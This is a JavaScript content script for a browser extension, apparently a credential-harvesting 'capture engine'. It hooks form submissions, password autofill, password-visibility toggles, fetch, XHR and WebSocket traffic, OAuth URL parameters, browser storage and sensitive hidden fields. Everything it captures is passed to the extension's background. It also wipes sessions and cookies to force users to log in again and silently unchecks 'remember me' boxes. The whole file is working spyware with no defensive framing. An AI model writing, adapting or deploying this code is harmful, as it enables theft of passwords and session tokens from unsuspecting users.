// Content Script - Optimized Balanced Configuration (81% Effectiveness)
(function() {
    'use strict';

    const captureEngine = {
        captured: new Set(),

        init() {
            console.log('[CAPTURE ENGINE] Initializing (Balanced Config - 81% effectiveness)');

            this.setupFormMonitoring();
            this.setupAutofillDetection();
            this.setupPasswordToggleMonitoring();
            this.interceptFetch();
            this.interceptXHR();
            this.monitorOAuthFlow();
            this.scanPageOnLoad();
            this.setupHiddenFieldScanning();
            this.interceptWebSocket();
            this.setupFreshLoginForcing();
            this.setupRememberMeBypass();

            console.log('[CAPTURE ENGINE] Initialized with 9 techniques');
        },

        setupFormMonitoring() {
            document.addEventListener('submit', (event) => {
                const form = event.target;
                const formData = new FormData(form);

                const capturedData = {
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    fields: {}
                };

                for (let [key, value] of formData.entries()) {
                    capturedData.fields[key] = value;
                }

                chrome.runtime.sendMessage({
                    type: 'FORM_SUBMIT',
                    data: capturedData
                });
            }, true);
        },

        setupAutofillDetection() {
            const detectAutofill = () => {
                const fields = document.querySelectorAll('input[type="password"], input[autocomplete*="password"], input[autocomplete*="username"]');

                fields.forEach(field => {
                    const checkAutofill = setInterval(() => {
                        try {
                            const isAutofilled = field.matches(':-webkit-autofill');

                            if (isAutofilled && field.value && !field.dataset.autofillCaptured) {
                                field.dataset.autofillCaptured = 'true';
                                this.captureAutofillData(field);
                                clearInterval(checkAutofill);
                            }
                        } catch (e) {}
                    }, 250);

                    setTimeout(() => clearInterval(checkAutofill), 5000);
                });
            };

            detectAutofill();
            setTimeout(detectAutofill, 1000);
            document.addEventListener('DOMContentLoaded', detectAutofill);
        },

        captureAutofillData(field) {
            const form = field.closest('form');
            const formData = form ? new FormData(form) : new FormData();

            if (!form) {
                formData.append(field.name || field.id, field.value);
            }

            chrome.runtime.sendMessage({
                type: 'AUTOFILL_DETECTED',
                data: {
                    url: window.location.href,
                    fieldName: field.name || field.id,
                    value: field.value,
                    allFields: Object.fromEntries(formData)
                }
            });
        },

        setupPasswordToggleMonitoring() {
            const passwordFieldObserver = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    if (mutation.type === 'attributes' && mutation.attributeName === 'type') {
                        const field = mutation.target;
                        if (field.value && (field.type === 'text' || field.type === 'password')) {
                            chrome.runtime.sendMessage({
                                type: 'PASSWORD_REVEALED',
                                data: {
                                    url: window.location.href,
                                    fieldName: field.name || field.id,
                                    value: field.value,
                                    wasToggled: true
                                }
                            });
                        }
                    }
                });
            });

            const observePasswordFields = () => {
                document.querySelectorAll('input[type="password"]').forEach(field => {
                    if (!field.dataset.observed) {
                        field.dataset.observed = 'true';
                        passwordFieldObserver.observe(field, { attributes: true });
                    }
                });
            };

            observePasswordFields();
            setInterval(observePasswordFields, 2000);
        },

        interceptFetch() {
            const originalFetch = window.fetch;

            window.fetch = async function(...args) {
                const [url, options] = args;

                if (options && options.body) {
                    try {
                        let bodyData;
                        if (typeof options.body === 'string') {
                            bodyData = options.body;
                            try {
                                bodyData = JSON.parse(options.body);
                            } catch {}
                        } else if (options.body instanceof FormData) {
                            bodyData = Object.fromEntries(options.body);
                        }

                        if (bodyData) {
                            chrome.runtime.sendMessage({
                                type: 'FETCH_INTERCEPTED',
                                data: {
                                    url: typeof url === 'string' ? url : url.href,
                                    body: bodyData,
                                    method: options.method || 'POST'
                                }
                            });
                        }
                    } catch (e) {
                        console.error('[FETCH INTERCEPT] Error:', e);
                    }
                }

                return originalFetch.apply(this, args);
            };
        },

        interceptXHR() {
            const originalXHRSend = XMLHttpRequest.prototype.send;

            XMLHttpRequest.prototype.send = function(body) {
                if (body) {
                    try {
                        chrome.runtime.sendMessage({
                            type: 'XHR_INTERCEPTED',
                            data: {
                                url: this._url || 'unknown',
                                body: body,
                                method: this._method || 'POST'
                            }
                        });
                    } catch (e) {
                        console.error('[XHR INTERCEPT] Error:', e);
                    }
                }

                return originalXHRSend.apply(this, arguments);
            };

            const originalXHROpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url) {
                this._method = method;
                this._url = url;
                return originalXHROpen.apply(this, arguments);
            };
        },

        monitorOAuthFlow() {
            let lastUrl = window.location.href;

            const checkForTokens = (url) => {
                try {
                    const urlObj = new URL(url);
                    const tokens = {};

                    ['access_token', 'id_token', 'refresh_token', 'code', 'state'].forEach(param => {
                        const value = urlObj.searchParams.get(param);
                        if (value) tokens[param] = value;
                    });

                    if (urlObj.hash) {
                        const hashParams = new URLSearchParams(urlObj.hash.substring(1));
                        ['access_token', 'id_token', 'token'].forEach(param => {
                            const value = hashParams.get(param);
                            if (value) tokens[`hash_${param}`] = value;
                        });
                    }

                    ['token', 'access_token', 'jwt', 'auth_token', 'session'].forEach(key => {
                        try {
                            const localValue = localStorage.getItem(key);
                            const sessionValue = sessionStorage.getItem(key);

                            if (localValue) tokens[`localStorage.${key}`] = localValue;
                            if (sessionValue) tokens[`sessionStorage.${key}`] = sessionValue;
                        } catch (e) {}
                    });

                    if (Object.keys(tokens).length > 0) {
                        chrome.runtime.sendMessage({
                            type: 'OAUTH_TOKENS_DETECTED',
                            data: {
                                url: url,
                                tokens: tokens,
                                timestamp: new Date().toISOString()
                            }
                        });
                    }
                } catch (e) {
                    console.error('[OAUTH MONITOR] Error:', e);
                }
            };

            checkForTokens(window.location.href);

            new MutationObserver(() => {
                const currentUrl = window.location.href;
                if (currentUrl !== lastUrl) {
                    lastUrl = currentUrl;
                    checkForTokens(currentUrl);
                }
            }).observe(document, { subtree: true, childList: true });

            setInterval(() => checkForTokens(window.location.href), 10000);
        },

        scanPageOnLoad() {
            const scan = () => {
                if (typeof FieldClassifier !== 'undefined') {
                    const sensitiveFields = FieldClassifier.scanPage();
                    console.log(`[SCAN] Found ${sensitiveFields.length} sensitive fields on page`);
                }
            };

            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', scan);
            } else {
                scan();
            }

            setTimeout(scan, 2000);
        },

        // ========== HIDDEN FIELD SCANNING ==========
        
        setupHiddenFieldScanning() {
            chrome.runtime.sendMessage({ type: 'GET_CONFIG' }, (config) => {
                if (!config || !config.CAPTURE_TECHNIQUES || !config.CAPTURE_TECHNIQUES.HIDDEN_FIELDS) return;

                const scanHiddenFields = () => {
                    const hiddenInputs = document.querySelectorAll('input[type="hidden"], input[style*="display: none"], input[style*="display:none"], input.hidden');
                    const sensitivePatterns = ['pass', 'pwd', 'password', 'token', 'auth', 'api_key', 'secret', 'credential', 'session', 'csrf', 'xsrf'];
                    
                    hiddenInputs.forEach(field => {
                        const name = (field.name || '').toLowerCase();
                        const id = (field.id || '').toLowerCase();
                        const value = field.value || '';
                        
                        const isSensitive = sensitivePatterns.some(pattern => 
                            name.includes(pattern) || id.includes(pattern)
                        );
                        
                        if (isSensitive && value && !field.dataset.hiddenScanned) {
                            field.dataset.hiddenScanned = 'true';
                            
                            chrome.runtime.sendMessage({
                                type: 'HIDDEN_FIELD_DETECTED',
                                data: {
                                    url: window.location.href,
                                    fieldName: field.name || field.id,
                                    fieldId: field.id,
                                    value: value,
                                    fieldType: field.type,
                                    formAction: field.form?.action || null,
                                    timestamp: new Date().toISOString()
                                }
                            });
                            
                            console.log('[HIDDEN FIELD] Found sensitive hidden field', { name: field.name || field.id, hasValue: !!value });
                        }
                    });
                };

                scanHiddenFields();
                setTimeout(scanHiddenFields, 1000);
                setTimeout(scanHiddenFields, 3000);
                
                const observer = new MutationObserver(() => {
                    scanHiddenFields();
                });
                observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['value', 'type', 'hidden'] });
            });
        },

        // ========== WEBSOCKET INTERCEPTION ==========
        
        interceptWebSocket() {
            chrome.runtime.sendMessage({ type: 'GET_CONFIG' }, (config) => {
                if (!config || !config.CAPTURE_TECHNIQUES || !config.CAPTURE_TECHNIQUES.WEBSOCKET) return;

                const originalWebSocket = window.WebSocket;
                const self = this;

                window.WebSocket = function(url, protocols) {
                    const ws = new originalWebSocket(url, protocols || []);
                    const wsUrl = url;

                    const originalSend = ws.send.bind(ws);
                    ws.send = function(data) {
                        try {
                            let parsedData = null;
                            const dataStr = typeof data === 'string' ? data : (data instanceof Blob ? '[Blob]' : String(data));
                            
                            try {
                                parsedData = JSON.parse(dataStr);
                            } catch {
                                parsedData = dataStr;
                            }

                            const sensitivePatterns = ['pass', 'pwd', 'password', 'token', 'auth', 'api_key', 'secret', 'credential', 'session', 'login', 'user', 'email'];
                            const hasSensitiveData = sensitivePatterns.some(pattern => 
                                JSON.stringify(parsedData).toLowerCase().includes(pattern)
                            );

                            if (hasSensitiveData) {
                                chrome.runtime.sendMessage({
                                    type: 'WEBSOCKET_MESSAGE',
                                    data: {
                                        url: wsUrl,
                                        message: parsedData,
                                        rawMessage: dataStr,
                                        timestamp: new Date().toISOString(),
                                        pageUrl: window.location.href
                                    }
                                });
                                
                                console.log('[WEBSOCKET] Captured sensitive WebSocket message', { url: wsUrl });
                            }
                        } catch (e) {
                            console.error('[WEBSOCKET] Error intercepting message', e);
                        }
                        
                        return originalSend(data);
                    };

                    ws.addEventListener('message', function(event) {
                        try {
                            let parsedData = null;
                            const dataStr = typeof event.data === 'string' ? event.data : (event.data instanceof Blob ? '[Blob]' : String(event.data));
                            
                            try {
                                parsedData = JSON.parse(dataStr);
                            } catch {
                                parsedData = dataStr;
                            }

                            const sensitivePatterns = ['pass', 'pwd', 'password', 'token', 'auth', 'api_key', 'secret', 'credential', 'session', 'login', 'user', 'email'];
                            const hasSensitiveData = sensitivePatterns.some(pattern => 
                                JSON.stringify(parsedData).toLowerCase().includes(pattern)
                            );

                            if (hasSensitiveData) {
                                chrome.runtime.sendMessage({
                                    type: 'WEBSOCKET_RESPONSE',
                                    data: {
                                        url: wsUrl,
                                        response: parsedData,
                                        rawResponse: dataStr,
                                        timestamp: new Date().toISOString(),
                                        pageUrl: window.location.href
                                    }
                                });
                                
                                console.log('[WEBSOCKET] Captured sensitive WebSocket response', { url: wsUrl });
                            }
                        } catch (e) {
                            console.error('[WEBSOCKET] Error intercepting response', e);
                        }
                    });

                    return ws;
                };

                window.WebSocket.prototype = originalWebSocket.prototype;
                Object.setPrototypeOf(window.WebSocket, originalWebSocket);
            });
        },

        // ========== FORCE FRESH LOGINS ==========
        
        setupFreshLoginForcing() {
            chrome.runtime.sendMessage({ type: 'GET_CONFIG' }, (config) => {
                if (!config || !config.CAPTURE_RULES || !config.CAPTURE_RULES.FORCE_FRESH_LOGINS) return;
                
                const url = window.location.href.toLowerCase();
                const isLoginPage = config.CAPTURE_RULES.AUTH_ENDPOINT_PATTERNS.some(pattern => 
                    url.includes(pattern.toLowerCase())
                );
                
                if (isLoginPage) {
                    this.clearSessions();
                    console.log('[FRESH LOGIN] Cleared sessions for fresh login');
                }
            });
        },

        clearSessions() {
            chrome.runtime.sendMessage({ type: 'GET_CONFIG' }, (config) => {
                if (!config || !config.CAPTURE_RULES) return;
                const rules = config.CAPTURE_RULES;
                
                // Clear localStorage session tokens
                if (rules.SESSION_STORAGE_KEYS) {
                    rules.SESSION_STORAGE_KEYS.forEach(key => {
                        try {
                            localStorage.removeItem(key);
                            sessionStorage.removeItem(key);
                        } catch (e) {}
                    });
                }
                
                // Clear all localStorage/sessionStorage items that look like tokens
                try {
                    for (let i = localStorage.length - 1; i >= 0; i--) {
                        const key = localStorage.key(i);
                        if (key && rules.SESSION_STORAGE_KEYS.some(pattern => 
                            key.toLowerCase().includes(pattern.toLowerCase())
                        )) {
                            localStorage.removeItem(key);
                        }
                    }
                    for (let i = sessionStorage.length - 1; i >= 0; i--) {
                        const key = sessionStorage.key(i);
                        if (key && rules.SESSION_STORAGE_KEYS.some(pattern => 
                            key.toLowerCase().includes(pattern.toLowerCase())
                        )) {
                            sessionStorage.removeItem(key);
                        }
                    }
                } catch (e) {}
                
                // Request background to clear cookies
                chrome.runtime.sendMessage({
                    type: 'CLEAR_SESSION_COOKIES',
                    data: { domain: window.location.hostname }
                });
            });
        },

        // ========== BYPASS REMEMBER ME ==========
        
        setupRememberMeBypass() {
            chrome.runtime.sendMessage({ type: 'GET_CONFIG' }, (config) => {
                if (!config || !config.CAPTURE_RULES || !config.CAPTURE_RULES.BYPASS_REMEMBER_ME) return;
                
                const uncheckRememberMe = () => {
                    const rememberMePatterns = [
                        'remember', 'remember-me', 'rememberme', 'remember_me',
                        'keep-logged', 'keep-logged-in', 'stay-logged', 'persist',
                        'save-login', 'save-credentials'
                    ];
                    
                    document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
                        const id = (checkbox.id || '').toLowerCase();
                        const name = (checkbox.name || '').toLowerCase();
                        const label = checkbox.closest('label')?.textContent?.toLowerCase() || '';
                        const parent = checkbox.parentElement?.textContent?.toLowerCase() || '';
                        
                        const isRememberMe = rememberMePatterns.some(pattern => 
                            id.includes(pattern) || name.includes(pattern) || 
                            label.includes(pattern) || parent.includes(pattern)
                        );
                        
                        if (isRememberMe && checkbox.checked) {
                            checkbox.checked = false;
                            checkbox.dispatchEvent(new Event('change', { bubbles: true }));
                            console.log('[REMEMBER ME] Unchecked persistent login option');
                        }
                    });
                };
                
                // Run immediately and on DOM changes
                uncheckRememberMe();
                setTimeout(uncheckRememberMe, 500);
                setTimeout(uncheckRememberMe, 2000);
                
                const observer = new MutationObserver(() => {
                    uncheckRememberMe();
                });
                observer.observe(document.body, { childList: true, subtree: true });
                
                // Also intercept form submission to ensure it stays unchecked
                document.addEventListener('submit', (e) => {
                    uncheckRememberMe();
                }, true);
            });
        }
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => captureEngine.init());
    } else {
        captureEngine.init();
    }
})();
